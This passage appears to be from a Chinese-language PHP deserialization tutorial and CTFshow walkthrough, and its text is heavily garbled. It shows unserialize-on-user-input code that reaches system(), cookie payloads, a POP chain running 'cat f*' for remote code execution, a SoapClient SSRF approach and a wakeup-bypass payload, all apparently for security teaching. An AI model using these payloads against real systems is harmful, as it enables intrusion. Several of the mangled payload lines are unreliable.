class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ver&quot;</span>;&#125; æ¥è§¦å‘ååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œ</span><br><span class="line">ä¼šå°†è¯¥å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„ <span class="title function_ invoke__">__destruct</span>() æ–¹æ³•ã€‚</span><br><span class="line">ç”±äº <span class="variable">$cmd</span> æˆå‘˜å˜é‡çš„å€¼è¢«è®¾ç½®ä¸ºå­—ç¬¦ä¸² <span class="string">&quot;ipconfig&quot;</span>ï¼Œå› æ­¤åœ¨è°ƒç”¨ <span class="title function_ invoke__">__destruct</span>() æ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd)ï¼Œ</span><br><span class="line">ä»è€Œæ‰§è¡Œ ipconfig å‘½ä»¤å¹¶è¾“å‡ºç›¸å…³ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‡½æ•°å¼•ç”¨ï¼Œæ— å¯¹è±¡åˆ›å»ºè§¦å‘é­”æœ¯æ–¹æ³•è‡ªå®šä¹‰å˜é‡</span></span><br><span class="line"><span class="comment">//?c=O:1:&quot;C&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[c]);</span><br></pre></td></tr></table></figure>

<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-22"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-22" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•&amp;æ¼æ´å¼•å‘&amp;å˜é‡ä¿®æ”¹ç­‰<br>CTFSHOW-å…³å¡254åˆ°260-åŸç”Ÿç±»&amp;POPæ„é€ <br>CMSä»£ç å®¡è®¡-Typecho)ååºåˆ—åŒ–&amp;é­”æœ¯æ–¹æ³•é€»è¾‘</p>
<h4 id="CTFSHOW-å…³å¡254-260åŸç”Ÿç±»-POPæ„é€ "><a href="#CTFSHOW-å…³å¡254-260åŸç”Ÿç±»-POPæ„é€ " class="headerlink" title="#CTFSHOW-å…³å¡254-260åŸç”Ÿç±»&amp;POPæ„é€ "></a>#CTFSHOW-å…³å¡254-260åŸç”Ÿç±»&amp;POPæ„é€ </h4><h6 id="254å¯¹è±¡å¼•ç”¨æ‰§è¡Œé€»è¾‘"><a href="#254å¯¹è±¡å¼•ç”¨æ‰§è¡Œé€»è¾‘" class="headerlink" title="254å¯¹è±¡å¼•ç”¨æ‰§è¡Œé€»è¾‘"></a>254å¯¹è±¡å¼•ç”¨æ‰§è¡Œé€»è¾‘</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=xxxxx&amp;password=xxxxxx</span><br><span class="line">æ€è·¯ï¼šä»ä»£ç åˆ†æè‹¥æƒ³è¾“å‡ºflagåˆ™éœ€è¦isvipä¸ºçœŸï¼Œè€Œisvipä¸ºçœŸéœ€è¦è°ƒç”¨æ–¹æ³•loginæ»¡è¶³æ¥æ”¶çš„å‚æ•°usernamå’Œpassword=xxxxxï¼Œåˆ™åªéœ€è¦é€šè¿‡getæ–¹å¼ä¼ å…¥æ­£ç¡®å‚æ•°å³å¯</span><br></pre></td></tr></table></figure>

<h6 id="255ååºåˆ—åŒ–å˜é‡ä¿®æ”¹1"><a href="#255ååºåˆ—åŒ–å˜é‡ä¿®æ”¹1" class="headerlink" title="255ååºåˆ—åŒ–å˜é‡ä¿®æ”¹1"></a>255ååºåˆ—åŒ–å˜é‡ä¿®æ”¹1</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Code</span><br><span class="line">publc ï¿¥svip=<span class="literal">true</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctishowUserl</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">senalize</span>(<span class="variable">$a</span>));</span><br><span class="line">Get userame=xxxxoxxpassword=xxxxx</span><br><span class="line">Cookie:user=O3A113A%<span class="number">22</span>ctfShowUser223A363A7Bs%<span class="number">3</span>A8%<span class="number">3</span>A22usema</span><br><span class="line">me223BsG0A693A122xxxxx1223Bs3AB1 <span class="number">3</span>A122password%<span class="number">22</span>%<span class="number">3</span>Bs9 <span class="number">3</span>A6</span><br><span class="line"><span class="number">9</span>%<span class="number">3</span>A02200000.<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5,<span class="number">3</span>A622isVp%,<span class="number">22</span>%<span class="number">3</span>BD%<span class="number">3</span>A1%<span class="number">3</span>æ—¥%ï¼Œ<span class="number">7</span>D</span><br><span class="line">æ€è·¯ï¼šåŒä¸Šå…³ï¼Œéœ€è¦å°†isvipç¡®å®šä¸ºtureï¼Œä½†æ˜¯ä»£ç ä¸­å¹¶æ— ä¿®æ”¹isvipçš„æ–¹æ³•ï¼Œæ­¤æ—¶éœ€è¦é€šè¿‡æ„é€ popé“¾å°†isvipç¡®å®šä¸ºtureï¼Œæ„é€ popé“¾çš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡é€šè¿‡åºåˆ—åŒ–çš„æ–¹æ³•è¾“å‡ºå‡ºæ¥ï¼ˆæ­¤æ—¶è¿˜éœ€è¦å°†åºåˆ—åŒ–åçš„å¯¹è±¡è¿›è¡Œurlç¼–ç é˜²æ­¢ä¹±ç çš„ç°è±¡å‘ç”Ÿï¼‰ï¼Œç„¶åå°†åºåˆ—åŒ–ç¼–ç åçš„å¯¹è±¡é€šè¿‡ä¿®æ”¹æ•°æ®åŒ…ä¼ å‚åˆ°cookieå­—æ®µä¸­çš„userå˜é‡ï¼Œç„¶åä»£ç ä¼šé€šè¿‡ååºåˆ—åŒ–çš„æ–¹å¼å°†isvipä¿®æ”¹ä¸ºtureï¼Œä¿®æ”¹æ•°æ®åŒ…æ—¶è¿˜éœ€è¦é€šè¿‡getæ–¹å¼ä¼ å‚usernameå’Œpasswordè¿›è¡Œç™»å½•éªŒè¯ï¼ˆå› ä¸ºåªæœ‰ç™»å½•æˆåŠŸä»¥åå‡½æ•°æ‰ä¼šä½¿å¾—<span class="keyword">if</span>ï¼ˆ<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)ï¼‰ä¸ºçœŸï¼‰ã€‚</span><br></pre></td></tr></table></figure>

<h6 id="256-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹2"><a href="#256-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹2" class="headerlink" title="256-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹2"></a>256-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹2</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">Sa=<span class="keyword">new</span> ctfShowUserï¼ˆï¼‰.</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(Sa));</span><br><span class="line">GET.userame=x&amp;password=y</span><br><span class="line">COOKIE:user=<span class="number">0</span>%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>usern</span><br><span class="line">ame%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span> passw0rd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A</span><br><span class="line">%<span class="number">22</span>y%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVp%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">æ€è·¯ï¼šåˆ†æä»£ç ï¼ŒåŒä¸Šå…³éœ€è¦æ»¡è¶³usernameä¸ç­‰äºpassword,åŒæ—¶usernameå’Œpasswordéƒ½ç­‰äºxxxxxxï¼Œ</span><br><span class="line">å¹¶ä¸”isvipä¸ºtureçš„æƒ…å†µä¸‹æ‰ä¼šè¾“å‡ºflagã€‚åˆ™éœ€è¦æ„é€ popé“¾ï¼Œ</span><br><span class="line">æ„é€ <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;åˆ™ä¼ å‚username=x&amp;password=y,</span><br><span class="line">å¹¶ä¸”ååºåˆ—åŒ–åä½¿å¾—<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)ä¸ºçœŸï¼Œisvipä¸ºtureã€‚å¹¶ä¸”usernameä¸ç­‰äºpasswordã€‚</span><br></pre></td></tr></table></figure>

<h6 id="257-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹-å¯¹è±¡è°ƒç”¨é€»è¾‘"><a href="#257-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹-å¯¹è±¡è°ƒç”¨é€»è¾‘" class="headerlink" title="257-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹&amp;å¯¹è±¡è°ƒç”¨é€»è¾‘"></a>257-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹&amp;å¯¹è±¡è°ƒç”¨é€»è¾‘</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">  	&#125;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span>(</span></span><br><span class="line"><span class="class"><span class="title">private</span> $<span class="title">code</span>=&#x27;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">f</span>*&quot;);&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">b</span>=<span class="title">new</span> <span class="title">ctfshowUser</span>();</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">b</span>)</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">æ€è·¯ï¼šåˆ†æä»£ç å¹¶æ²¡æœ‰è¾“å‡º<span class="title">flag</span>çš„åœ°æ–¹ï¼Œä½†æ˜¯å­˜åœ¨<span class="title">eval</span>()å‡½æ•°,æ­¤å‡½æ•°åœ¨ååºåˆ—åŒ–ä¸­å¸¸è¢«ç”¨æ¥<span class="title">RCE</span>ï¼Œ</span></span><br><span class="line"><span class="class">å› æ­¤è¯•å›¾æ„é€ <span class="title">pop</span>é“¾--</span></span><br><span class="line"><span class="class">é¦–å…ˆé€šè¿‡<span class="title">new</span> å¯¹è±¡æ¥è°ƒç”¨<span class="title">__construct</span>()é­”æœ¯æ–¹æ³•</span></span><br><span class="line"><span class="class">--é€šè¿‡é­”æœ¯æ–¹æ³•è°ƒç”¨<span class="title">backDoor</span>æ–¹æ³•ï¼ˆæ­¤å¤„è¦ä¿®æ”¹<span class="title">class</span>çš„å€¼ä¸º<span class="title">bankDoor</span>ï¼‰</span></span><br><span class="line"><span class="class">--ä¿®æ”¹<span class="title">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();ï¼ˆå› ä¸º<span class="title">backDoor</span>ä¸­$<span class="title">code</span>ä¸ºç§æœ‰æ‰€ä»¥éœ€è¦æ–°å»º <span class="title">backDoor</span>æ‰èƒ½è°ƒç”¨ï¼‰</span></span><br><span class="line"><span class="class">--ç„¶åä¿®æ”¹$<span class="title">code</span>çš„å˜é‡å€¼ä¸º&quot;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">flag</span>.<span class="title">php</span>&quot;);&quot;;æ„é€ å®Œæˆ</span></span><br><span class="line"><span class="class">--ä¼ å…¥æ­£ç¡®çš„å‚æ•°ï¼Œä¿®æ”¹æ•°æ®åŒ…ä¸­<span class="title">cookie</span>å­—æ®µååºåˆ—åŒ–<span class="title">RCE</span>æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<h6 id="258-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹-å¯¹è±¡è°ƒç”¨é€»è¾‘"><a href="#258-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹-å¯¹è±¡è°ƒç”¨é€»è¾‘" class="headerlink" title="258-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹&amp;å¯¹è±¡è°ƒç”¨é€»è¾‘"></a>258-ååºåˆ—åŒ–å‚æ•°ä¿®æ”¹&amp;å¯¹è±¡è°ƒç”¨é€»è¾‘</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šä»£ç é€»è¾‘åŸºæœ¬å’Œä¸Šä¸€å…³ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†æ­£åˆ™è¿‡æ»¤,é€šè¿‡æ›¿æ¢è¯­å¥å°†æ•°å­—æ›¿æ¢æˆ+æ•°å­—ï¼Œå³å¯ç»•è¿‡ã€‚</span><br><span class="line">æ¯”å¦‚åŸæ¥åºåˆ—åŒ–åçš„å¯¹è±¡ä¸­å«æœ‰<span class="number">8</span>ï¼Œæ›¿æ¢ä¸º+<span class="number">8</span></span><br><span class="line">/[oc]:\d+:/iï¼Œå…¶ä¸­ / è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸï¼Œ[oc] è¡¨ç¤ºåŒ¹é…å­—ç¬¦é›†ä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼Œ</span><br><span class="line">å³ o æˆ– cï¼Œ\d+ è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—å­—ç¬¦ï¼Œå³ <span class="number">0</span> åˆ° <span class="number">9</span>ï¼Œ: è¡¨ç¤ºåŒ¹é…å†’å·å­—ç¬¦ã€‚</span><br><span class="line">å› æ­¤ï¼Œè¯¥æ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰æ˜¯åŒ¹é…ä»¥ o: æˆ– c: å¼€å¤´ã€åé¢è·Ÿç€ä¸€ä¸²æ•°å­—å’Œå†’å·çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">i è¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œå³ o å’Œ c å¯ä»¥æ˜¯å¤§å†™æˆ–å°å†™å­—æ¯ã€‚</span><br></pre></td></tr></table></figure>

<h6 id="259-åŸç”Ÿæ€ç±»8Callé­”æœ¯æ–¹æ³•8é…å°SSRF"><a href="#259-åŸç”Ÿæ€ç±»8Callé­”æœ¯æ–¹æ³•8é…å°SSRF" class="headerlink" title="259-åŸç”Ÿæ€ç±»8Callé­”æœ¯æ–¹æ³•8é…å°SSRF"></a>259-åŸç”Ÿæ€ç±»8Callé­”æœ¯æ–¹æ³•8é…å°SSRF</h6><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a><br>æ€è·¯ï¼šå¤§æ¦‚æ˜¯è§‚å¯Ÿç»™å‡ºçš„jsä»£ç å’Œflag.php å‘ç°å­˜åœ¨ä¸€ä¸ªæ²¡æœ‰è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨phpä¸­çš„åŸç”Ÿç±»è°ƒç”¨ã€‚<br>ç›®çš„æ˜¯åœ¨index.phpé€šè¿‡ååºåˆ—åŒ–ä¸€ä¸ªåŸç”Ÿç±»å‘flag.phpå‘é€è¯·æ±‚ï¼Œç„¶åflag.phpç”¨file_put_contentsæŠŠflagæ”¾åˆ°flag.txté‡Œã€‚å‘è¯·æ±‚ç”¨çš„æ˜¯phpé‡Œçš„ä¸€ä¸ªå†…ç½®ç±»ï¼šSoapClient,è¿™ä¸ªç±»ä¸­æœ‰ä¸ª__callé­”æœ¯æ–¹æ³•,å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ï¼Œä¼šæ‰§è¡Œcall()é­”æœ¯æ–¹æ³•ã€‚æ¥è¾¾åˆ°æˆ‘ä»¬ä¼ªé€ è¯·æ±‚å¤´çš„ç›®çš„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshowçš„å¤§éƒ¨åˆ†phpååºåˆ—é¢˜ç›®æˆ‘ä¹Ÿéƒ½åšäº†ï¼Œå¯ä»¥ç›´æ¥å»çœ‹å†™çš„wpæ–‡ç« å¯èƒ½ä¼šæ›´è¯¦ç»†ä¸€ç‚¹ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬46å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-PHPååºåˆ—åŒ–-åŸç”Ÿç±»-æ¼æ´ç»•è¿‡-å…¬ç§æœ‰å±æ€§"><a href="#ç¬¬46å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-PHPååºåˆ—åŒ–-åŸç”Ÿç±»-æ¼æ´ç»•è¿‡-å…¬ç§æœ‰å±æ€§" class="headerlink" title="ç¬¬46å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;PHPååºåˆ—åŒ–&amp;åŸç”Ÿç±»&amp;æ¼æ´ç»•è¿‡&amp;å…¬ç§æœ‰å±æ€§"></a>ç¬¬46å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;PHPååºåˆ—åŒ–&amp;åŸç”Ÿç±»&amp;æ¼æ´ç»•è¿‡&amp;å…¬ç§æœ‰å±æ€§</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-26"><a href="#çŸ¥è¯†ç‚¹ï¼š-26" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•å…¨è§£<br>2ã€ååºåˆ—åŒ–å˜é‡å±æ€§å…¨è§£<br>3ã€ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•åŸç”Ÿç±»<br>4ã€ååºåˆ—åŒ–è¯­è¨€ç‰¹æ€§æ¼æ´ç»•è¿‡</p>
<p>~å…¶ä»–é­”æœ¯æ–¹æ³•</p>
<p>å…±æœ‰&amp;ç§æœ‰&amp;ä¿æŠ¤<br>è¯­è¨€æ¨¡å¼æ–¹æ³•æ¼æ´<br>~åŸç”Ÿç±»è·å–åˆ©ç”¨é…åˆ</p>
<h4 id="ååºåˆ—åŒ–åˆ©ç”¨å¤§æ¦‚åˆ†ç±»ä¸‰ç±»"><a href="#ååºåˆ—åŒ–åˆ©ç”¨å¤§æ¦‚åˆ†ç±»ä¸‰ç±»" class="headerlink" title="#ååºåˆ—åŒ–åˆ©ç”¨å¤§æ¦‚åˆ†ç±»ä¸‰ç±»"></a>#ååºåˆ—åŒ–åˆ©ç”¨å¤§æ¦‚åˆ†ç±»ä¸‰ç±»</h4><p>-é­”æœ¯æ–¹æ³•çš„è°ƒç”¨é€»è¾‘å¦‚è§¦å‘æ¡ä»¶<br>-è¯­è¨€åŸç”Ÿç±»çš„è°ƒç”¨é€»è¾‘å¦‚SoapClient<br>-è¯­è¨€è‡ªèº«çš„å®‰å…¨ç¼ºé™·å¦‚CVE-2016-7124</p>
<h4 id="ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š-1"><a href="#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š-1" class="headerlink" title="#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š"></a>#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š</h4><p>-PHP&amp;Java&amp;Python</p>
<p>PHPé­”æœ¯æ–¹æ³•å†æ¥ä¸€é</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨</span></span><br></pre></td></tr></table></figure>

<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-23"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-23" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>æ–¹æ³•&amp;å±æ€§-è°ƒç”¨è¯¦è§£&amp;å˜é‡æ•°æ®è¯¦è§£<br>CTF-è¯­è¨€æ¼æ´-wakeupæ–¹æ³•ç»•è¿‡<br>CTF-æ–¹æ³•åŸç”Ÿç±»è·å–&amp;åˆ©ç”¨&amp;é…åˆå…¶ä»–</p>
<h4 id="æ–¹æ³•-å±æ€§-è°ƒç”¨è¯¦è§£-å˜é‡æ•°æ®è¯¦è§£"><a href="#æ–¹æ³•-å±æ€§-è°ƒç”¨è¯¦è§£-å˜é‡æ•°æ®è¯¦è§£" class="headerlink" title="#æ–¹æ³•&amp;å±æ€§-è°ƒç”¨è¯¦è§£&amp;å˜é‡æ•°æ®è¯¦è§£"></a>#æ–¹æ³•&amp;å±æ€§-è°ƒç”¨è¯¦è§£&amp;å˜é‡æ•°æ®è¯¦è§£</h4><p>å¯¹è±¡å˜é‡å±æ€§ï¼š<br>publicï¼ˆå…¬å…±çš„ï¼‰åœ¨æœ¬ç±»å†…éƒ¨ã€å¤–éƒ¨ç±»ã€å­ç±»éƒ½å¯ä»¥è®¿é—®<br>protectï¼ˆå—ä¿æŠ¤çš„ï¼‰åªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®<br>private(ç§äººçš„ï¼‰åªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨<br>åºåˆ—åŒ–æ•°æ®æ˜¾ç¤ºï¼š<br>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00ç±»å%00æˆå‘˜å<br>protectå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00*%00æˆå‘˜å</p>
<h4 id="CTFè¯­è¨€æ¼æ´-wakeupï¼ˆï¼‰æ–¹æ³•ç»•è¿‡"><a href="#CTFè¯­è¨€æ¼æ´-wakeupï¼ˆï¼‰æ–¹æ³•ç»•è¿‡" class="headerlink" title="#CTFè¯­è¨€æ¼æ´-wakeupï¼ˆï¼‰æ–¹æ³•ç»•è¿‡"></a>#CTFè¯­è¨€æ¼æ´-wakeupï¼ˆï¼‰æ–¹æ³•ç»•è¿‡</h4><p>æå®¢å¤§æŒ‘æˆ˜20191 PHP CVE2016-7124</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¦‚æœå­˜åœ¨wakeupæ–¹æ³•ï¼Œè°ƒç”¨<span class="title function_ invoke__">unserilize</span>(Oæ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨wakeupæ–¹æ³•ï¼Œ</span><br><span class="line">ä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œ</span><br><span class="line"><span class="number">1</span>ã€ä¸‹è½½æºç åˆ†æï¼Œè§¦å‘flagæ¡ä»¶</span><br><span class="line"><span class="number">2</span>ã€åˆ†æä¼šç¼ºå‘è°ƒç”¨wakeupå¼ºåˆ¶usernameå€¼</span><br><span class="line"><span class="number">3</span>ã€åˆ©ç”¨è¯­è¨€æ¼æ´ç»•è¿‡CVE-<span class="number">2016</span>-<span class="number">7124</span></span><br><span class="line"><span class="number">4</span>ã€æ„é€ payloadåä¿®æ”¹æ»¡è¶³æ¼æ´æ¡ä»¶å‘</span><br><span class="line">Pyload</span><br><span class="line">select=<span class="number">0</span>%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Name&quot;</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span 